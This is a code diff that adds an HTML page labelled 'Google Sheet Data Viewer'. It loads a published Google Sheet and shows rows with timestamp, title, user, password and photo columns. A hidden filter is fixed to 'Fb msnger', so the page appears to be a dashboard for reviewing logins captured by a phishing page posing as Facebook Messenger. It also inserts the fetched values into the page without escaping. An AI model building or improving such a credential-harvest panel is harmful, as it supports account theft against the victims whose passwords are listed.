@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sheet Data Viewer</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+        }
+        .table-container {
+            margin-top: 20px;
+        }
+        .fab {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+        }
+img {
+  max-width: 100%;
+  height: auto;
+  max-height: 100px;
+  object-fit: contain;
+}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Google Sheet Data Viewer</h2>
+        <div class="input-group mb-3">
+            <input type="hidden" id="filter-input" placeholder="Filter by title" class="form-control" value="Fb msnger">
+            <div class="input-group-append">
+                <button id="filter-btn" class="btn btn-primary">Filter</button>
+            </div>
+        </div>
+        <div class="table-container">
+            <table id="data-table" class="table table-striped">
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Title</th>
+                        <th>User</th>
+                        <th>Password</th>
+                        <th>Photo</th>
+                    </tr>
+                </thead>
+                <tbody id="data-body">
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <button id="refresh-btn" class="fab btn btn-primary btn-lg rounded-circle">
+        <i class="fas fa-sync-alt"></i>
+    </button>
+
+    <script>
+        const sheetUrl = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vSGqjKjw12tFLEBQ3qy6wirPhPd1Rv5-7jPn6he9UFW_eLvSv93PyBt3ps6pa95CLu428ddjlj7wTCc/pub?gid=924319481&single=true&output=tsv';
+        const filterInput = document.getElementById('filter-input');
+        const filterBtn = document.getElementById('filter-btn');
+        const refreshBtn = document.getElementById('refresh-btn');
+        const dataBody = document.getElementById('data-body');
+
+        refreshBtn.addEventListener('click', fetchData);
+        filterBtn.addEventListener('click', filterData);
+
+        fetchData();
+
+        function fetchData() {
+  fetch(sheetUrl)
+    .then(response => response.text())
+    .then(data => {
+      const rows = data.split('\n').map(row => row.split('\t'));
+      rows.shift(); // Remove header row
+      rows.reverse(); // Reverse the order of the rows
+      const tableData = rows.map(row => {
+        return `
+          <tr>
+            <td>${row[0]}</td>
+            <td>${row[1]}</td>
+            <td>${row[2]}</td>
+            <td>${row[3]}</td>
+            <td><img src="${row[4]}">${row[4]}</td>
+          </tr>
+        `;
+      }).join('');
+      dataBody.innerHTML = tableData;
+      filterData();
+    })
+    .catch(error => alert(error));
+}
+
+        function filterData() {
+            const filterValue = filterInput.value.toLowerCase();
+            const rows = dataBody.children;
+            Array.from(rows).forEach(row => {
+                const titleCell = row.children[1];
+                if (titleCell.textContent.toLowerCase().includes(filterValue)) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
